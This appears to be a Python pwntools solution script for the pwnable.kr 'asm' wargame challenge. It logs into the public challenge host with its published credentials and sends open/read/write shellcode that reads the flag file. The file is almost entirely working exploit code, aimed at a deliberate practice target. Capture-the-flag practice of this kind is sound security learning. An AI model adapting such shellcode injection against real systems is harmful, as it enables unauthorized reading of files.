#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Date: 2019-07-18 20:53:53

from pwn import *
#context.log_level='debug'
#p = process(argv=['./asm'])
s = ssh(host='pwnable.kr',user='asm',port=2222,password='guest')
p = s.connect_remote('127.0.0.1',9026)
context(arch='amd64',os='linux')

shellcode=''
shellcode += shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)
#print '-------------------------'
#print shellcode
#print '-------------------------'
print p.recvuntil('shellcode: ')
p.sendline(asm(shellcode))
print p.recvline()